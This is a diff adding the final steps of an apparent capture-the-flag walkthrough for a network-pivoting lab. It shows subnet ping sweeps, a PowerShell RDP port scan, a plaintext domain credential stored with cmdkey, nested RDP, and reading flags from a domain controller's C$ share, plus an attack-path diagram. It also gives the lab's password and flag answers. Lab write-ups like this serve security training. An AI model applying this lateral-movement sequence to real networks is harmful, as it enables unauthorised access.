@@ -5137,18 +5137,352 @@ for /L %i in (1,1,254) do @ping -n 1 -w 200 172.16.6.%i > nul && echo 172.16.6.%
 ---
 
 ```text
-output
+172.16.6.35 is UP
+```
+
+</td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\System32 >`**
+
+</td>
+<td>
+
+```cmd
+arp -a
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+Interface: 172.16.5.35 --- 0x4
+  Internet Address      Physical Address      Type
+  172.16.5.15           00-50-56-b0-73-48     dynamic
+  172.16.255.255        ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+
+Interface: 172.16.6.35 --- 0x5
+  Internet Address      Physical Address      Type
+  172.16.255.255        ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+```
+
+</td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\System32 >`**
+
+</td>
+<td>
+
+```cmd
+nslookup inlanefreight.local
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+DNS request timed out.
+    timeout was 2 seconds.
+Server:  UnKnown
+Address:  172.16.10.5
+
+DNS request timed out.
+    timeout was 2 seconds.
+DNS request timed out.
+    timeout was 2 seconds.
+DNS request timed out.
+    timeout was 2 seconds.
+DNS request timed out.
+    timeout was 2 seconds.
+*** Request to UnKnown timed-out
 ```
 
 </td>
 </tr>
 </table>
 
+</details>
 
+<details>
+<summary><h3>Step 11 - Second Pivot Network Enumeration</h3></summary>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\System32 >`**
+
+</td>
+<td>
+
+```cmd
+for /L %i in (1,1,254) do @ping -n 1 -w 200 172.16.6.%i >nul && echo 172.16.6.%i: True
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+172.16.6.25: True
+172.16.6.35: True
+172.16.6.45: True
+```
+
+</td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\System32 >`**
+
+</td>
+<td>
+
+```cmd
+for /L %i in (1,1,254) do @powershell -c "if ((New-Object System.Net.Sockets.TcpClient).BeginConnect('172.16.6.%i',3389,$null,$null).AsyncWaitHandle.WaitOne(200)) { echo '172.16.6.%i - RDP OPEN' }"
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+172.16.6.25 - RDP OPEN
+172.16.6.35 - RDP OPEN
+```
+
+</td>
+</tr>
+</table>
+
+</details>
+
+<details>
+<summary><h3>Step 12</h3></summary>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\System32 >`**
+
+</td>
+<td>
+
+```cmd
+cmdkey /generic:TERMSRV/172.16.6.25 /user:INLANEFREIGHT\vfrank /pass:"Imply wet Unmasked!"
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+CMDKEY: Credential added successfully.
+```
+
+</td>
+</tr>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\System32 >`**
+
+</td>
+<td>
+
+```cmd
+mstsc /v:172.16.6.25
+```
+
+</td>
+</tr>
+</table>
+
+</details>
+
+<details>
+<summary><h3>Step 13</h3></summary>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\Users\vfrank>`**
+
+</td>
+<td>
+
+```cmd
+type C:\Flag.txt
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+N3tw0rk-H0pp1ng-f0R-FuN
+```
+
+</td>
+</tr>
+</table>
+
+</details>
+
+<details>
+<summary><h3>Step 14</h3></summary>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\Users\vfrank>`**
+
+</td>
+<td>
+
+```cmd
+dir \\172.16.10.5\c$\
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+Directory of \\172.16.10.5\c$
+
+05/18/2022  12:33 PM                20 Flag.txt.txt
+09/14/2018  11:12 PM    <DIR>          PerfLogs
+12/14/2020  06:43 PM    <DIR>          Program Files
+09/14/2018  11:21 PM    <DIR>          Program Files (x86)
+05/03/2022  09:06 AM    <DIR>          Users
+05/03/2022  09:09 AM    <DIR>          Windows
+               1 File(s)             20 bytes
+               5 Dir(s)  33,668,403,200 bytes free
+```
+
+</td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\Users\vfrank>`**
+
+</td>
+<td>
+
+```cmd
+type \\172.16.10.5\c$\Flag.txt.txt
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+3nd-0xf-Th3-R@inbow!
+```
+
+</td>
+</tr>
+</table>
 
 </details>
 
 </details>
+
+
+```mermaid
+flowchart TD
+    %% Nodes Definition
+    KALI["<b>🔴 Attack Host (Kali)</b><br/>VPN Tun0"]
+    
+    subgraph NET_5["<b>Subnet 172.16.5.0/16</b>"]
+        W35["<b>🖥️ MS01 (Pivot 1)</b><br/>172.16.5.35<br/>Creds: vfrank"]
+    end
+
+    subgraph NET_6["<b>Subnet 172.16.6.0/16</b>"]
+        W25["<b>🖥️ WS01 (Pivot 2)</b><br/>172.16.6.25<br/>Dual-Homed"]
+    end
+
+    subgraph NET_10["<b>Subnet 172.16.10.0/16</b>"]
+        DC10["<b>🎯 Domain Controller</b><br/>172.16.10.5<br/>Final Flag"]
+    end
+
+    %% Techniques & Connections
+    KALI ==>|"<b>1. SSH Tunnel / RDP</b>"| W35
+    W35 ==>|"<b>2. Nested RDP<br/>(cmdkey injection)</b>"| W25
+    W25 ==>|"<b>3. SMB Admin Share<br/>(C$)</b>"| DC10
+
+    %% Styling
+    style KALI fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
+    style W35 fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
+    style W25 fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
+    style DC10 fill:#3a5a3a,stroke:#90EE90,stroke-width:4px,color:#fff
+    
+    style NET_5 fill:none,stroke:#6c8ebf,stroke-width:2px,stroke-dasharray: 5
+    style NET_6 fill:none,stroke:#6c8ebf,stroke-width:2px,stroke-dasharray: 5
+    style NET_10 fill:none,stroke:#90EE90,stroke-width:2px,stroke-dasharray: 5
+
+    %% Link styling
+    linkStyle 0 stroke:#ff6b6b,stroke-width:3px
+    linkStyle 1 stroke:#FFD700,stroke-width:3px
+    linkStyle 2 stroke:#90EE90,stroke-width:3px
+```
 
 </details>
 
